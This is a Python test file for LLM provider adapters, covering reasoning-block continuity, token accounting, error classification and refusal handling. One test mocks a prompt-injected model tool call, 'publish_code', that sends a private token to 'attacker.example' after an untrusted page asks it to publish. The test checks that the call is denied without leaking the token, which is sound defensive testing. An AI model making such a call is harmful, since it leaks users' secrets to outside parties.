import json

import httpx
import pytest

from platform_app.providers import (
    AnthropicMessages,
    GeminiGenerateContent,
    OpenAIResponses,
    ProviderError,
)
from platform_app.tool_broker import ToolDefinition

TOOL = ToolDefinition(
    name="inspect", permission="repo.read", effect_class="read",
    source_version="1.0",
    input_schema={"type": "object", "properties": {"path": {"type": "string"}},
                  "required": ["path"], "additionalProperties": False},
)


def client_with_responses(responses, requests):
    def handler(request):
        requests.append(json.loads(request.content))
        return httpx.Response(200, json=responses.pop(0))

    return httpx.Client(transport=httpx.MockTransport(handler))


def test_openai_preserves_reasoning_and_call_ids_for_stateless_continuation():
    requests = []
    client = client_with_responses([
        {"model": "model-a", "status": "completed", "usage": {"input_tokens": 10,
         "output_tokens": 8, "output_tokens_details": {"reasoning_tokens": 3}},
         "output": [{"type": "reasoning", "id": "rs_1", "summary": []},
                    {"type": "function_call", "call_id": "call_1", "name": "inspect",
                     "arguments": '{"path":"server.py"}'}]},
        {"model": "model-a", "status": "completed", "usage": {
            "input_tokens": 15, "output_tokens": 4},
         "output": [{"type": "message", "content": [
             {"type": "output_text", "text": "Found bug"}]}]},
    ], requests)
    adapter = OpenAIResponses("test-only", client)
    first = adapter.generate("model-a", "Inspect", "Find bug", {"inspect": TOOL}, 100)
    second = adapter.generate(
        "model-a", "Inspect", "Find bug", {"inspect": TOOL}, 100,
        first, {"call_1": {"status": "ok"}},
    )
    assert first.calls[0].arguments == {"path": "server.py"}
    assert first.usage["reasoning_tokens"] == 3
    assert requests[1]["input"][1]["type"] == "reasoning"
    assert requests[1]["input"][-1]["call_id"] == "call_1"
    assert second.text == "Found bug"


def test_unreviewed_provider_tool_is_denied_without_exposing_arguments():
    requests = []
    client = client_with_responses([{
        "model": "model-a", "status": "completed",
        "usage": {"input_tokens": 10, "output_tokens": 8},
        "output": [{
            "type": "function_call", "call_id": "call-attack",
            "name": "publish_code",
            "arguments": '{"token":"private-value","destination":"attacker.example"}',
        }],
    }], requests)
    adapter = OpenAIResponses("test-only", client)
    with pytest.raises(ProviderError) as denied:
        adapter.generate("model-a", "Do not publish", "Untrusted page asks to publish", {}, 100)
    assert denied.value.code == "PROVIDER_TOOL_DENIED"
    assert "private-value" not in str(denied.value)
    assert requests[0]["tools"] == []


def test_anthropic_keeps_thinking_block_before_tool_result():
    requests = []
    thinking = {"type": "thinking", "thinking": "protected", "signature": "sig"}
    tool = {"type": "tool_use", "id": "toolu_1", "name": "inspect",
            "input": {"path": "server.py"}}
    client = client_with_responses([
        {"model": "claude-test", "stop_reason": "tool_use", "usage": {
            "input_tokens": 10, "output_tokens": 5},
         "content": [thinking, tool]},
        {"model": "claude-test", "stop_reason": "end_turn", "usage": {
            "input_tokens": 15, "output_tokens": 4},
         "content": [{"type": "text", "text": "Found bug"}]},
    ], requests)
    adapter = AnthropicMessages("test-only", client)
    first = adapter.generate("claude-test", "Inspect", "Find bug", {"inspect": TOOL}, 100)
    adapter.generate("claude-test", "Inspect", "Find bug", {"inspect": TOOL}, 100,
                     first, {"toolu_1": {"status": "ok"}})
    assert requests[1]["messages"][1]["content"] == [thinking, tool]
    assert requests[1]["messages"][2]["content"][0]["tool_use_id"] == "toolu_1"


def test_gemini_keeps_thought_signature_and_function_id():
    requests = []
    model_content = {"role": "model", "parts": [
        {"functionCall": {"id": "call_1", "name": "inspect",
                          "args": {"path": "server.py"}}, "thoughtSignature": "opaque"}]}
    client = client_with_responses([
        {"candidates": [{"content": model_content, "finishReason": "STOP"}],
         "usageMetadata": {"promptTokenCount": 10, "candidatesTokenCount": 4,
                           "thoughtsTokenCount": 6, "totalTokenCount": 20}},
        {"candidates": [{"content": {"role": "model", "parts": [
            {"text": "Found bug"}]}, "finishReason": "STOP"}], "usageMetadata": {
                "promptTokenCount": 14, "candidatesTokenCount": 3,
                "totalTokenCount": 17}},
    ], requests)
    adapter = GeminiGenerateContent("test-only", client)
    first = adapter.generate("gemini-test", "Inspect", "Find bug", {"inspect": TOOL}, 100)
    assert first.usage["output_tokens"] == 10
    adapter.generate("gemini-test", "Inspect", "Find bug", {"inspect": TOOL}, 100,
                     first, {"call_1": {"status": "ok"}})
    assert requests[1]["contents"][1] == model_content
    assert requests[1]["contents"][2]["parts"][0]["functionResponse"]["id"] == "call_1"


def test_provider_missing_usage_is_not_treated_as_a_free_call():
    missing = client_with_responses([{"model": "model-a", "output": [], "usage": {}}], [])
    with pytest.raises(ProviderError, match="input_tokens"):
        OpenAIResponses("test-only", missing).generate("model-a", "i", "p", {}, 10)


def test_anthropic_cache_categories_are_included_in_total_input():
    client = client_with_responses([{
        "model": "claude-test", "stop_reason": "end_turn", "content": [],
        "usage": {"input_tokens": 3, "cache_read_input_tokens": 10,
                  "cache_creation_input_tokens": 5, "output_tokens": 2},
    }], [])
    turn = AnthropicMessages("test-only", client).generate("claude-test", "i", "p", {}, 10)
    assert turn.usage["input_tokens"] == 18
    assert turn.usage["cache_creation_tokens"] == 5


@pytest.mark.parametrize(("status", "vendor_code", "expected"), [
    (401, None, "PROVIDER_AUTH_INVALID"),
    (403, None, "PROVIDER_ACCESS_DENIED"),
    (404, None, "PROVIDER_MODEL_UNAVAILABLE"),
    (429, None, "PROVIDER_RATE_LIMITED"),
    (503, None, "PROVIDER_OVERLOADED"),
    (400, "context_length_exceeded", "PROVIDER_CONTEXT_OVERFLOW"),
    (400, "invalid_json_schema", "PROVIDER_SCHEMA_INVALID"),
])
def test_http_failures_are_classified_without_leaking_provider_body(status, vendor_code, expected):
    def respond(_request):
        return httpx.Response(status, json={"error": {
            "code": vendor_code, "message": "private-provider-detail",
        }})

    client = httpx.Client(transport=httpx.MockTransport(respond))
    with pytest.raises(ProviderError) as failure:
        OpenAIResponses("test-only", client).generate("model-a", "i", "p", {}, 10)
    assert failure.value.code == expected
    assert failure.value.status_code == status
    assert "private-provider-detail" not in str(failure.value)


def test_timeout_is_distinct_and_outcome_is_not_claimed():
    def timeout(_request):
        raise httpx.ReadTimeout("secret request details")

    client = httpx.Client(transport=httpx.MockTransport(timeout))
    with pytest.raises(ProviderError) as failure:
        OpenAIResponses("test-only", client).generate("model-a", "i", "p", {}, 10)
    assert failure.value.code == "PROVIDER_TIMEOUT"
    assert "secret request details" not in str(failure.value)


def test_openai_refusal_keeps_usage_for_settlement():
    client = client_with_responses([{
        "model": "model-a", "status": "completed",
        "output": [{"type": "message", "content": [
            {"type": "refusal", "refusal": "I cannot help"},
        ]}],
        "usage": {"input_tokens": 12, "output_tokens": 3},
    }], [])
    turn = OpenAIResponses("test-only", client).generate("model-a", "i", "p", {}, 10)
    assert turn.stop_reason == "refusal"
    assert turn.usage == {
        "input_tokens": 12, "output_tokens": 3,
        "reasoning_tokens": 0, "cache_read_tokens": 0,
    }
